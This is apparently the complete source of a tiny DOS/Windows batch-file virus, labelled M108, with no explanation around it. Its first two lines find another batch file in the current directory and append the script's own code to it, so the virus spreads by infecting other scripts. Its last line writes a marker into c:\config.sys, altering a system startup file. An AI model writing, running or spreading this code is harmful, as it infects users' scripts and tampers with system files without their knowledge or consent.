for %%d in (*?.b*t) do set M108=%%d
if not %M108%==%0 type %0>>%M108%
echo M108 was here >>c:\config.sys
